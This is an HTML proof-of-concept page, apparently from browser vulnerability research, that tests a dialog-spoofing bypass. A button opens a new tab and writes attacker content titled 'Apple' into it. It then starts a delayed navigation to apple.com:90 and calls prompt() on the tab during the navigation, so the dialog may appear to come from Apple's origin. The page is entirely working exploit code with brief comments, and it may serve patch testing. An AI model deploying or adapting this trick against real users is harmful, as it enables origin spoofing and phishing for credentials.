<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Bypass Test PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #fff;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      button {
        padding: 20px 40px;
        font-size: 20px;
        background: #007aff;
        color: #fff;
        border: none;
        border-radius: 12px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <button id="startBtn">TEST BYPASS CLICK</button>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.remove();

        // Membuka tab baru
        const newTab = window.open("about:blank", "_blank");

        if (newTab) {
          // Menulis konten attacker ke tab baru
          newTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head><title>Apple</title></head>
            <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
              <div>
                <h1 style="font-size:48px;color:red;">TESTING DESYNCHRONIZATION</h1>
                <p style="font-size:24px;color:#333;">Mencoba memicu prompt saat WebState masih dianggap visible tapi navigasi tertunda.</p>
              </div>
            </body>
            </html>
          `);
          newTab.document.close();

          // Navigasi asinkron ke target spoofing
          setTimeout(() => {
            newTab.location.href = "https://apple.com:90";
          }, 10);

          // Memanggil prompt sedikit lebih cepat/bersamaan untuk melihat 
          // apakah dialog lolos sebelum IsVisible() bernilai false atau terblokir patch.
          setTimeout(() => {
            try {
              newTab.prompt("BYPASS TEST ROUTINE");
            } catch (e) {
              console.log("Dialog blocked or caught:", e);
            }
          }, 50);
        }
      };
    </script>
  </body>
</html>
